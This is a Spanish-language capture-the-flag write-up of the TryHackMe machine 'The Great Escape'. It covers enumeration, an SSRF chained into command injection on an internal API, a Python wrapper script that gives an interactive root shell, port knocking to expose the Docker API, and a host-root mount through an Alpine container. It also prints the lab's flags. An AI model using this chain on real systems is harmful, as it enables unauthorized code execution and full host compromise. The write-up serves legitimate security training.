Write up de la maquina The Great Escape de dificultad media de la plataforma de TryHackMe.

![](/assets/img/great_escape/machine.png)

## Enumeracion
Empezemos enumerando que puertos tiene abierto la maquina victima.
```bash
❯ nmap -p- --open 10.10.150.154
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-13 20:11 -05
Nmap scan report for 10.10.150.154
Host is up (0.17s latency).
Not shown: 54562 closed tcp ports (conn-refused), 10971 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 66.67 seconds
```
Intentemos detectar la version que corre para estos puertos.
```bash
# Nmap 7.93 scan initiated Thu Apr 13 17:12:25 2023 as: nmap -sCV -p22,80,2375 -oN targeted 10.10.31.83
Nmap scan report for 10.10.31.83
Host is up (0.22s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh?
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp   open  http    nginx 1.19.6
|_http-server-header: nginx/1.19.6
| http-robots.txt: 3 disallowed entries 
|_/api/ /exif-util /*.bak.txt$
|_http-title: docker-escape-nuxt
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port22-TCP:V=7.93%I=7%D=4/13%Time=64387E55%P=x86_64-pc-linux-gnu%r(Gene
SF:ricLines,5,"{\*G\r\n");
Service Info: OS: linux

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Apr 13 17:15:41 2023 -- 1 IP address (1 host up) scanned in 196.19 seconds

```
nmap nos detecto un par de rutas del archivo robots.txt mas adelante vemos esto, veamos la web.
![](/assets/img/great_escape/web.png)

Veamos las rutas que tiene el archivo robots.txt que nos reporto el nmap.
```bash
❯ curl -s 10.10.150.154/robots.txt
User-agent: *
Allow: /
Disallow: /api/
# Disallow: /exif-util
Disallow: /*.bak.txt$
```
En la ruta exif-util podemos subir un archivo, o poner la url de del archivo.
![](/assets/img/great_escape/up.png)

Veamos si el tema de la url esta funcional.
![](/assets/img/great_escape/url.png)

Le damos en submit y nos llega una peticion del servidor.
```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.150.154 - - [13/Apr/2023 20:26:16] code 404, message File not found
10.10.150.154 - - [13/Apr/2023 20:26:16] "GET /test.png HTTP/1.1" 404 -
```
En este punto este campo nos podria servir para aplicar un SSRF (Server Side Request Forgery), veamos si nos deja apuntar al localhost de la propia maquina.
![](/assets/img/great_escape/lol.png)
Nos dice connection refused, lo que quiere decir que el puerto 80 esta cerrado, si hacemos un testeo manual con puerto tipicos como el 8000 y 8080 este ultimo nos devuelve contenido.
![](/assets/img/great_escape/por.png)

Por ahora este SSRF no nos va a servir de a mucho, sigamos enumerando la web, antes en el robots.txt vimos algo interesante los archivos de backups estan con la extension .bak.txt y vimos que el archivo exif-util esta en la web, veamos si podemos ver el backup de este archivo, y lo podemos leer.
```javascript
❯ curl -s 10.10.150.154/exif-util.bak.txt
<template>
  <section>
    <div class="container">
      <h1 class="title">Exif Utils</h1>
      <section>
        <form @submit.prevent="submitUrl" name="submitUrl">
          <b-field grouped label="Enter a URL to an image">
            <b-input
              placeholder="http://..."
              expanded
              v-model="url"
            ></b-input>
            <b-button native-type="submit" type="is-dark">
              Submit
            </b-button>
          </b-field>
        </form>
      </section>
      <section v-if="hasResponse">
        <pre>
          {{ response }}
        </pre>
      </section>
    </div>
  </section>
</template>

<script>
export default {
  name: 'Exif Util',
  auth: false,
  data() {
    return {
      hasResponse: false,
      response: '',
      url: '',
    }
  },
  methods: {
    async submitUrl() {
      this.hasResponse = false
      console.log('Submitted URL')
      try {
        const response = await this.$axios.$get('http://api-dev-backup:8080/exif', {
          params: {
            url: this.url,
          },
        })
        this.hasResponse = true
        this.response = response
      } catch (err) {
        console.log(err)
        this.$buefy.notification.open({
          duration: 4000,
          message: 'Something bad happened, please verify that the URL is valid',
          type: 'is-danger',
          position: 'is-top',
          hasIcon: true,
        })
      }
    },
  },
}
</script>
```
En esta parte del codigo esta definido a donde van a ir las peticiones que lanzamos desde la cargada de imagenes que vimos hace un momento, y esta definiendo un parametro url.

```javascript
try {
        const response = await this.$axios.$get('http://api-dev-backup:8080/exif', {
          params: {
            url: this.url,
          },
        })
```
podemos comprobar que las peticiones desde la web viajen igual a como esta definida en este backup.
![](/assets/img/great_escape/view.png)
Igual esta haciendo la peticion a la api y le pasa el parametro url del cual tenemos control.

## Explotacion

Al momento de nosotros introducir una url la web por detras le pasa atraves del parametro url nuestra data a la ruta http://api-dev-backup:8080/exif, pero claro hay un servidor de por medio que realiza un tipo de sanitizacion antes de llegar al punto final, pero podemos tener una comunicacion directa con la ruta que se encarga de realizar las consultas atraves del SSRF, que detectamos en la web.

La peticion la voy a interceptar con burpsuite.
![](/assets/img/great_escape/burp.png)
Podemos hacer la comunicacion con el servidor si dejamos el campo vacio, podemos observar que hay un comando ejecutandose por detras, este campo en la web que esta de intermediaria nos obligaba a poner una url, pero en el punto final podemos poner lo que queramos.
![](/assets/img/great_escape/rce.png)
Como esta ejecutando un comando a nivel de sistema con un ; podemos cerrar el primero comando y ejecutar cualquier comando y bueno tenemos una rce.
![](/assets/img/great_escape/id.png)
Es un poco molesto estar poniendo que comandos queremos ejecutar de esta manera por lo que voy a crear un script de python atraves del cual ejecutar los comandos en la url.
```python
#!/usr/bin/python3

import signal, sys, time, requests, pdb, re

def ctrl_c(sig, frame):

    print("\n\n[!] Saliendo.\n")
    sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, ctrl_c)

if len(sys.argv) < 2:
    print("\nUso:\n\tpython3 %s <ip>" % sys.argv[0])
    sys.exit(1)

url = 'http://' + sys.argv[1]

def makeRequest(main_url, command):
    
    url_command = main_url + command
    r = requests.get(url_command)
    
#    data = re.findall('information\n(.*?)\n', r.text)[0]
    return r.text

def makeCommand():

    main_url = url + '/api/exif?url=http://api-dev-backup:8080/exif?url=;'
    
    while True:
        
        command = input('$~ ')

        data = makeRequest(main_url, command)
        
        output = re.sub('.*\n', '', data, count=5)
        output = output.replace("               ----------------------------------------\n               curl: no URL specified!\ncurl: try 'curl --help' or 'curl --manual' for more information\n", "")

        print(output)

if __name__ == "__main__":
    makeCommand()

```
Simplemente lo ejecutamos y le tenemos que pasar como argumento la ip.
```bash
❯ python3 exploit.py 10.10.150.154
$~ id
uid=0(root) gid=0(root) groups=0(root)

$~ 
```
Si miramos la ip nos daremos cuenta que estamos ejecutando comandos en lo que parece un contenedor aunque me parece extraño la ip que tiene.
```bash
$~ hostname -I
192.168.112.3 
```
Enumerando un poco en el directorio root hay un proyecto de git.
```bash
$~ ls -la /root
total 28
drwx------ 1 root root 4096 Jan  7  2021 .
drwxr-xr-x 1 root root 4096 Jan  7  2021 ..
lrwxrwxrwx 1 root root    9 Jan  6  2021 .bash_history -> /dev/null
-rw-r--r-- 1 root root  570 Jan 31  2010 .bashrc
drwxr-xr-x 1 root root 4096 Jan  7  2021 .git
-rw-r--r-- 1 root root   53 Jan  6  2021 .gitconfig
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
-rw-rw-r-- 1 root root  201 Jan  7  2021 dev-note.txt

$~ 
```
Enumeremos los commit de este proyecto.
```bash
$~ git --git-dir /root/.git log
commit 5242825dfd6b96819f65d17a1c31a99fea4ffb6a
Author: Hydra <hydragyrum@example.com>
Date:   Thu Jan 7 16:48:58 2021 +0000

    fixed the dev note

commit 4530ff7f56b215fa9fe76c4d7cc1319960c4e539
Author: Hydra <hydragyrum@example.com>
Date:   Wed Jan 6 20:51:39 2021 +0000

    Removed the flag and original dev note b/c Security

commit a3d30a7d0510dc6565ff9316e3fb84434916dee8
Author: Hydra <hydragyrum@example.com>
Date:   Wed Jan 6 20:51:39 2021 +0000

    Added the flag and dev notes

$~ 
```
Vemos un commit muy interesante agregaron la flag y notas de desarrollo veamos este commit.
```bash
$~ git --git-dir /root/.git show a3d30a7d0510dc6565ff9316e3fb84434916dee8
commit a3d30a7d0510dc6565ff9316e3fb84434916dee8
Author: Hydra <hydragyrum@example.com>
Date:   Wed Jan 6 20:51:39 2021 +0000

    Added the flag and dev notes

diff --git a/dev-note.txt b/dev-note.txt
new file mode 100644
index 0000000..89dcd01
--- /dev/null
+++ b/dev-note.txt
@@ -0,0 +1,9 @@
+Hey guys,
+
+I got tired of losing the ssh key all the time so I setup a way to open up the docker for remote admin.
+
+Just knock on ports 42, 1337, 10420, 6969, and 63000 to open the docker tcp port.
+
+Cheers,
+
+Hydra
\ No newline at end of file
diff --git a/flag.txt b/flag.txt
new file mode 100644
index 0000000..aae8129
--- /dev/null
+++ b/flag.txt
@@ -0,0 +1,3 @@
+You found the root flag, or did you?
+
+THM{0cb4b947043cb5c0486a454b75a10876}
\ No newline at end of file

$~
```
Hay vemos la flag, pero mas interesante la nota que hay, esta hablando de que esta cansado de tener que abrir el puerto de administracion de docker y tuvo que aver una configurado una regla en el firewall que al momento de escanear en orden los puertos que nos indican, un nuevo puerto deberia abrirse esta tecnica se llama port knocking (golpeo de puertos).

El golpeo de puertos es un mecanismo para abrir puertos externamente en un firewall mediante una secuencia preestablecida de intentos de conexión a puertos que se encuentran cerrados.

Simplemente tenemos que tocar uno por uno en orden los puertos que nos indican, lo voy hacer con nmap de la siguiente manera.
```bash
❯ for port in 42 1337 10420 6969 63000;do echo "[+] Puerto $port"; nmap -p$port 10.10.75.132 ;done
```
Si volvemos a escanear la maquina victima con nmap veremos que aparece otro puerto abierto.
```bash
❯ nmap -p- --open 10.10.75.132
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-13 21:23 -05
Nmap scan report for 10.10.75.132
Host is up (0.17s latency).
Not shown: 48968 closed tcp ports (conn-refused), 16564 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
2375/tcp open  docker

Nmap done: 1 IP address (1 host up) scanned in 83.86 seconds
```
Vemos el puerto 2375 que es el puerto docker, bueno atraves de este puerto podemos hacer cosas interesantes, como crear nuevos contenedores, entre otras muchas mas cosas.

Veamos Que imaganes hay displonibles, esto lo hare definiendo una variable de entorno, la cual tiene la ip y el puerto del demonio de docker.

```bash
❯ DOCKER_HOST=tcp://10.10.75.132:2375 docker images
REPOSITORY                                    TAG       IMAGE ID       CREATED       SIZE
exif-api-dev                                  latest    4084cb55e1c7   2 years ago   214MB
exif-api                                      latest    923c5821b907   2 years ago   163MB
frontend                                      latest    577f9da1362e   2 years ago   138MB
endlessh                                      latest    7bde5182dc5e   2 years ago   5.67MB
nginx                                         latest    ae2feff98a0c   2 years ago   133MB
debian                                        10-slim   4a9cd57610d6   2 years ago   69.2MB
registry.access.redhat.com/ubi8/ubi-minimal   8.3       7331d26c1fdf   2 years ago   103MB
alpine                                        3.9       78a2ce922f86   2 years ago   5.55MB
```
Ahora voy a crear un contenedor y voy a usar una montura para que toda la raiz del sistema de la maquina victima me lo monte en el directorio /mnt/machine del contenedor que voy a crear.
```bash
❯ DOCKER_HOST=tcp://10.10.75.132:2375 docker run -it -v /:/mnt/machine alpine:3.9 sh
/ # ls /mnt/machine/
bin             dev             home            initrd.img.old  lib64           media           opt             root            sbin            swapfile        tmp             var             vmlinuz.old
boot            etc             initrd.img      lib             lost+found      mnt             proc            run             srv             sys             usr             vmlinuz
/ #
```
Podemos ver que en la carpeta /mnt/machine se creo correctamente la montura y vemos toda la raiz del sistema, podemos visualizar la flag que esta en el directorio /root.

```bash
/ # cat /mnt/machine/root/flag.txt 
Congrats, you found the real flag!

THM{c62517c0cad93ac93a92b1315a32d734}
/ # 
```
Gracias por leer.